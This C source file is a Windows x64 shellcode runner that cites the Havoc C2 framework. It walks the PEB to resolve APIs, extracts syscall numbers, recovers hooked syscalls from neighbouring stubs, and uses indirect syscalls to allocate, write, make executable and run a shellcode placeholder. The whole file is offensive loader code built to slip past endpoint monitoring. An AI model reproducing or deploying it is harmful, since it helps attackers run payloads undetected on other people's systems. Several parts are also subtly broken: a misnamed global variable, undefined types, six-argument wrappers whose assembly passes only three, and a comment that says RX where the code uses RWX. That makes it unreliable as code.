/*
 * Shellcode Runner — Indirect Syscall x64 Windows
 *
 * Compiles with: x86_64-w64-mingw32-gcc -Os -fno-asynchronous-unwind-tables
 *                -fno-ident -falign-functions=1 -fpack-struct=8 --no-seh
 *                --gc-sections -s -nostdlib -o payload.exe shellcode_runner.c
 *
 * Technique: PEB walking for API resolution (zero IAT).
 *            SSN extraction via "4c 8b d1 b8" pattern scan in ntdll.
 *            Indirect syscall: mov r10,rcx; mov eax,ssn; jmp [r11].
 *            Hooked syscall detection via neighbor SSN推算.
 *
 * Reference: Havoc Demon Syscalls.c — SysExtract / FindSsnOfHookedSyscall
 *
 * Placeholders replaced at build time:
 *   {{SHELLCODE_BYTES}}  — comma-separated hex bytes
 *   {{SHELLCODE_LEN}}    — number of bytes
 */

typedef unsigned char    BYTE;
typedef unsigned short   WORD;
typedef unsigned long    DWORD;
typedef long long        LONG_PTR;
typedef unsigned long long ULONG_PTR;
typedef unsigned long long QWORD;
typedef int              BOOL;
typedef void*            HANDLE;

#define PAGE_EXECUTE_READWRITE  0x40
#define PAGE_READWRITE          0x04
#define MEM_COMMIT              0x1000
#define MEM_RESERVE             0x2000
#define INFINITE                0xFFFFFFFF

/* ── Shellcode placeholder ── */
static BYTE shellcode[] = { {{SHELLCODE_BYTES}} };
static DWORD shellcode_len = {{SHELLCODE_LEN}};

/* ── PE structures for PEB walking ── */
typedef struct {
    WORD    e_magic;
    LONG    e_lfanew;
} IMAGE_DOS_HEADER;

typedef struct {
    DWORD  Signature;
    struct { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp;
             DWORD PointerToSymbolTable; DWORD NumberOfSymbols;
             WORD SizeOfOptionalHeader; WORD Characteristics; } FileHeader;
    struct { WORD Magic; BYTE _[0x5c - 0x4]; DWORD BaseOfCode;
             ULONG_PTR ImageBase; DWORD SectionAlignment; DWORD FileAlignment;
             WORD _2[0x4]; DWORD SizeOfImage; DWORD SizeOfHeaders;
             DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics;
             ULONG_PTR SizeOfStackReserve; ULONG_PTR SizeOfStackCommit;
             ULONG_PTR SizeOfHeapReserve; ULONG_PTR SizeOfHeapCommit;
             DWORD NumberOfRvaAndSizes;
             struct { DWORD VirtualAddress; DWORD Size; } DataDirectory[16];
    } OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct {
    char    Name[8];
    DWORD   VirtualSize;
    DWORD   VirtualAddress;
    DWORD   SizeOfRawData;
    DWORD   PointerToRawData;
    DWORD   _[4];
} IMAGE_SECTION_HEADER;

typedef struct {
    DWORD   Hint;
    char    Name[1];
} IMAGE_IMPORT_BY_NAME;

typedef struct {
    union { DWORD Characteristics; DWORD FirstThunk; } u;
    DWORD   TimeDateStamp;
    DWORD   ForwarderChain;
    DWORD   Name;
    DWORD   OriginalFirstThunk;
} IMAGE_IMPORT_DESCRIPTOR;

/* ── PEB / LDR structures ── */
typedef struct _UNICODE_STRING {
    WORD    Length;
    WORD    MaximumLength;
    WORD*   Buffer;
} UNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    struct _LDR_DATA_TABLE_ENTRY* InLoadOrderLinks;
    struct _LDR_DATA_TABLE_ENTRY* InMemoryOrderLinks;
    struct _LDR_DATA_TABLE_ENTRY* InInitializationOrderLinks;
    void*   DllBase;
    void*   EntryPoint;
    ULONG_PTR SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG   Length;
    BOOL    Initialized;
    void*   SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE    Reserved[0x18];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

/* ── String helpers ── */
#define U_PTR(x)   ((ULONG_PTR)(x))
#define C_PTR(x)   ((void*)(x))
#define DREF_U8(x)  (*(BYTE*)(x))
#define DREF_U16(x) (*(WORD*)(x))
#define DREF_U32(x) (*(DWORD*)(x))

/* DJB2 hash — same as Havoc's HashString */
static DWORD hash_djb2(const char* str)
{
    DWORD hash = 5381;
    const BYTE* p = (const BYTE*)str;
    while (*p) {
        hash = ((hash << 5) + hash) + (*p | 0x20); /* case-insensitive */
        p++;
    }
    return hash;
}

static int strcmp_ci(const char* a, const WORD* wbuf, int wlen)
{
    char buf[256];
    int i;
    if (wlen > 255) return 1;
    for (i = 0; i < wlen; i++) buf[i] = (char)wbuf[i];
    buf[i] = 0;
    const BYTE* pa = (const BYTE*)a;
    const BYTE* pb = (const BYTE*)buf;
    while (*pa && *pb) {
        BYTE ca = *pa; if (ca >= 'A' && ca <= 'Z') ca += 0x20;
        BYTE cb = *pb; if (cb >= 'A' && cb <= 'Z') cb += 0x20;
        if (ca != cb) return 1;
        pa++; pb++;
    }
    return 0;
}

/* ── PEB walking: get module base by hash ── */
static void* get_module_base(DWORD nameHash)
{
    PEB* peb;
    __asm__("mov rax, gs:[0x60]" : "=a"(peb));

    PPEB_LDR_DATA ldr = peb->Ldr;
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;

    while (entry->DllBase) {
        if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
            /* Quick hash check */
            if (hash_djb2("kernel32.dll") == nameHash ||
                hash_djb2("ntdll.dll") == nameHash) {
                /* Compare by converting unicode to lowercase ascii */
                const char* target = (nameHash == hash_djb2("kernel32.dll")) ? "kernel32.dll" : "ntdll.dll";
                if (strcmp_ci(target, entry->BaseDllName.Buffer,
                              entry->BaseDllName.Length / 2) == 0) {
                    return entry->DllBase;
                }
            }
        }
        entry = (PLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
    }
    return 0;
}

/* ── PEB walking: resolve exported function by hash ── */
static void* resolve_func(void* module, DWORD nameHash)
{
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)module;
    if (dos->e_magic != 0x5A4D) return 0;

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return 0;

    DWORD expRva = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    if (!expRva) return 0;

    struct { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion;
             WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions;
             DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames;
             DWORD AddressOfNameOrdinals; }* exp;
    exp = (void*)((BYTE*)module + expRva);

    DWORD* names = (DWORD*)((BYTE*)module + exp->AddressOfNames);
    WORD* ords   = (WORD*)((BYTE*)module + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)module + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)module + names[i]);
        if (hash_djb2(name) == nameHash) {
            return (BYTE*)module + funcs[ords[i]];
        }
    }
    return 0;
}

/* ── SSN extraction (Havoc pattern: "4c 8b d1 b8") ── */
static BOOL extract_ssn(void* func, WORD* outSsn)
{
    for (int offset = 0; offset < 512; offset++) {
        if (DREF_U8((BYTE*)func + offset) == 0xC3) break; /* ret */

        if (DREF_U8((BYTE*)func + offset + 0) == 0x4C &&
            DREF_U8((BYTE*)func + offset + 1) == 0x8B &&
            DREF_U8((BYTE*)func + offset + 2) == 0xD1 &&
            DREF_U8((BYTE*)func + offset + 3) == 0xB8) {
            BYTE lo = DREF_U8((BYTE*)func + offset + 4);
            BYTE hi = DREF_U8((BYTE*)func + offset + 5);
            *outSsn = (WORD)((hi << 8) | lo);
            return 1;
        }
    }
    return 0;
}

/* ── Hooked syscall fallback (scan neighbors) ── */
static BOOL resolve_hooked_ssn(void* func, WORD* outSsn)
{
    /* Scan forward/backward for unhooked neighbor syscalls */
    for (int i = 1; i < 500; i++) {
        void* neighbor = (BYTE*)func + (32 * i); /* ~32 bytes per syscall stub */
        WORD neighborSsn;
        if (extract_ssn(neighbor, &neighborSsn)) {
            *outSsn = (WORD)(neighborSsn - i);
            return 1;
        }
        neighbor = (BYTE*)func - (32 * i);
        if (extract_ssn(neighbor, &neighborSsn)) {
            *outSsn = (WORD)(neighborSsn + i);
            return 1;
        }
    }
    return 0;
}

/* ── Find syscall instruction in a function ── */
static void* find_syscall_addr(void* func)
{
    for (int offset = 0; offset < 512; offset++) {
        if (DREF_U8((BYTE*)func + offset) == 0xC3) break;
        if (DREF_U8((BYTE*)func + offset + 0) == 0x4C &&
            DREF_U8((BYTE*)func + offset + 1) == 0x8B &&
            DREF_U8((BYTE*)func + offset + 2) == 0xD1 &&
            DREF_U8((BYTE*)func + offset + 3) == 0xB8) {
            for (int j = 0; j < 32; j++) {
                if (DREF_U16((BYTE*)func + offset + j) == 0x050F) {
                    return (BYTE*)func + offset + j;
                }
            }
            break;
        }
    }
    return 0;
}

/* ── Syscall config structure passed to inline asm ── */
typedef struct {
    QWORD syscallAddress;  /* address of 'syscall' instruction in ntdll */
    DWORD ssn;             /* syscall service number */
} SYS_CONFIG;

static SYS_CONFIG g_sysNtAlloc;
static SYS_CONFIG g_sysNtWrite;
static SYS_CONFIG g_sysNtProtect;
static SYS_CONFIG g_sysWait;

/* ── Hash constants (pre-computed DJB2) ── */
#define H_VirtualAlloc      0x05c5c44d  /* placeholder — runtime resolved */
#define H_NtAllocateVirtualMemory  0
#define H_NtWriteVirtualMemory     0
#define H_NtProtectVirtualMemory   0
#define H_NtWaitForSingleObject    0

/* ── Inline indirect syscall wrapper ──
 * Uses Havoc's SysInvoke pattern:
 *   mov r10, rcx
 *   mov eax, [r11 + 0x8]   — read SSN from SYS_CONFIG
 *   jmp QWORD [r11]        — jump to syscall instruction */

static QWORD __attribute__((ms_abi))
sys_call(SYS_CONFIG* cfg, void* arg1, void* arg2, void* arg3, void* arg4, void* arg5, void* arg6)
{
    QWORD result;
    __asm__ volatile(
        "mov r10, rcx          \n\t"
        "mov r11, %[cfg]       \n\t"
        "mov eax, [r11 + 0x8]  \n\t"  /* SSN */
        "jmp QWORD [r11]       \n\t"  /* indirect syscall */
        "ret                   \n\t"
        : "=a"(result)
        : [cfg]"r"(cfg), "c"(arg1), "d"(arg2)
        : "memory", "r10", "r11"
    );
    return result;
}

/* ── NtAllocateVirtualMemory wrapper ── */
static QWORD nt_alloc(void** base, SIZE_T* size, ULONG protect)
{
    return sys_call(&g_sysNtAlloc, (void*)-1, base, 0, size,
                    (void*)MEM_COMMIT | (void*)MEM_RESERVE, (void*)protect);
}

/* ── NtWriteVirtualMemory wrapper ── */
static QWORD nt_write(HANDLE proc, void* base, void* buf, SIZE_T len)
{
    SIZE_T written = 0;
    return sys_call(&g_sysNtWrite, proc, base, buf, (void*)len,
                    (void*)&written, 0);
}

/* ── NtProtectVirtualMemory wrapper ── */
static QWORD nt_protect(void* base, SIZE_T* size, ULONG protect, ULONG* old)
{
    return sys_call(&g_sysNtProtect, (void*)-1, &base, size, (void*)protect,
                    old, 0);
}

/* ── NtWaitForSingleObject wrapper ── */
static QWORD nt_wait(HANDLE handle, DWORD ms)
{
    return sys_call(&g_sysWait, handle, (void*)0, (void*)(QWORD)ms, 0, 0, 0);
}

/* ── Initialize all syscalls ── */
static BOOL init_syscalls(void)
{
    void* ntdll = get_module_base(hash_djb2("ntdll.dll"));
    if (!ntdll) return 0;

    /* Resolve function addresses */
    void* fNtAlloc = resolve_func(ntdll, hash_djb2("NtAllocateVirtualMemory"));
    void* fNtWrite = resolve_func(ntdll, hash_djb2("NtWriteVirtualMemory"));
    void* fNtProt  = resolve_func(ntdll, hash_djb2("NtProtectVirtualMemory"));
    void* fNtWait  = resolve_func(ntdll, hash_djb2("NtWaitForSingleObject"));

    if (!fNtAlloc || !fNtWrite || !fNtProt || !fNtWait) return 0;

    /* Extract SSNs with hooked fallback */
    if (!extract_ssn(fNtAlloc, (WORD*)&g_sysNtAlloc.ssn))
        if (!resolve_hooked_ssn(fNtAlloc, (WORD*)&g_sysNtAlloc.ssn)) return 0;
    if (!extract_ssn(fNtWrite, (WORD*)&g_sysNtWrite.ssn))
        if (!resolve_hooked_ssn(fNtWrite, (WORD*)&g_sysNtWrite.ssn)) return 0;
    if (!extract_ssn(fNtProt, (WORD*)&g_sysNtProtect.ssn))
        if (!resolve_hooked_ssn(fNtProt, (WORD*)&g_sysNtProtect.ssn)) return 0;
    if (!extract_ssn(fNtWait, (WORD*)&g_sysNtWait.ssn))
        if (!resolve_hooked_ssn(fNtWait, (WORD*)&g_sysNtWait.ssn)) return 0;

    /* Extract syscall instruction addresses */
    g_sysNtAlloc.syscallAddress  = (QWORD)find_syscall_addr(fNtAlloc);
    g_sysNtWrite.syscallAddress  = (QWORD)find_syscall_addr(fNtWrite);
    g_sysNtProtect.syscallAddress = (QWORD)find_syscall_addr(fNtProt);
    g_sysNtWait.syscallAddress   = (QWORD)find_syscall_addr(fNtWait);

    if (!g_sysNtAlloc.syscallAddress || !g_sysNtWrite.syscallAddress ||
        !g_sysNtProtect.syscallAddress || !g_sysNtWait.syscallAddress) return 0;

    return 1;
}

/* ── Entry point ── */
void mainCRTStartup(void)
{
    /* Step 1: Resolve syscalls via PEB + SSN extraction */
    if (!init_syscalls()) return;

    /* Step 2: Allocate RW memory via indirect syscall */
    void* base = 0;
    SIZE_T sz = shellcode_len;
    if (nt_alloc(&base, &sz, PAGE_READWRITE) != 0) return;

    /* Step 3: Write shellcode via indirect syscall */
    if (nt_write((void*)-1, base, shellcode, shellcode_len) != 0) return;

    /* Step 4: Flip to RX via indirect syscall */
    ULONG oldProt;
    if (nt_protect(base, &sz, PAGE_EXECUTE_READWRITE, &oldProt) != 0) return;

    /* Step 5: Execute — cast to function pointer */
    ((void(*)(void))base)();
}
